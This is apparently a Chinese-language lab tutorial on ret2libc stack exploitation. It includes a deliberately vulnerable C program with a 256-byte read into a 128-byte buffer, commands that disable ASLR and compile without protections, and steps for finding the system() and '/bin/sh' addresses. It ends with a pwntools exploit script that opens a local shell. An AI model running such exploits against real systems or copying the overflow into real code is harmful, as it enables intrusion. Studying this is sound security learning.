# 基本ROP-ret2libc(1)

> 参考：[ret2syscall-Cyberangel](https://www.yuque.com/cyberangel/rg9gdm/crpf61#h2-7) 
>



**原理**

共享库libc.so中存在system()以及execve()，找到/bin/sh字符串，覆盖掉返回地址即可获得当前进程的控制权



**源码**

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void vulnerable_function() {
	char buf[128];
	read(STDIN_FILENO, buf, 256);
}
int main(int argc, char** argv) {
	vulnerable_function();
	write(STDOUT_FILENO, "Hello, World\n", 13);
}
```



**关闭ASLR**

```shell
echo 0 > /proc/sys/kernel/randomize_va_space
```



**编译**

```shell
gcc ret2lib.c -fno-stack-protector -no-pie -m32 -o ret2lib
```



**查看共享模块**

```shell
$ ldd ret2lib
        linux-gate.so.1 (0xf7f9c000)
        libc.so.6 => /lib32/libc.so.6 (0xf7d8f000)
        /lib/ld-linux.so.2 (0xf7f9e000)
```



**寻找system()函数**

找到的地址要加上基地址（ldd命令查到的libc.so.6基地址）

```shell
$ objdump -T /lib32/libc.so.6 | grep system
001379b0 g    DF .text  00000066 (GLIBC_2.0)  svcerr_systemerr
00044cc0 g    DF .text  00000037  GLIBC_PRIVATE __libc_system
00044cc0  w   DF .text  00000037  GLIBC_2.0   system
```



**寻找/bin/sh字符串**

找到的地址要加上基地址（ldd命令查到的libc.so.6基地址）

```shell
$ ROPgadget --binary /lib32/libc.so.6 --string '/bin/sh'
Strings information
============================================================
0x0018fb62 : /bin/sh
```



**手动测量溢出长度**

`cyclic 200`生成200长度无序字符串，传入栈中判断溢出，先使用**peda-gdb**打开ret2lib

```shell
$ gdb ret2lib	# 打开ret2lib
gdb-peda$ start	# 开始调试，中断在main函数
gdb-peda$ c		# 按c继续执行，接着将200位字符串输入
Invalid $PC address: 0x6261616b	# 得到溢出字符，每两位数字转换为10进制，再对应ASCII得到字符为baad
$ cyclic -l 0x6261616b	# 得到溢出字符前面位数140
```



**EXP**

```python
from pwn import *
#context.log_level = 'debug'
debug = 1
if debug:
	sh = process('./ret2lib')
system_addr = 0xf7e08870
binsh_addr  = 0xf7f47968
payload = flat(['a' * 140,system_addr,0xdeadbeef,binsh_addr])

def pwn(sh, payload):
	sh.sendline(payload)
	sh.interactive()
pwn(sh, payload)
```



保存为`exp.py`，使用Python3执行，成功getshell

```shell
# python 1.py                  
[+] Starting local process './ret2lib': pid 4351
/home/kali/Desktop/1.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload = flat(
[*] Switching to interactive mode
$ ls
1.py  peda-session-rop.txt  ret2lib

```

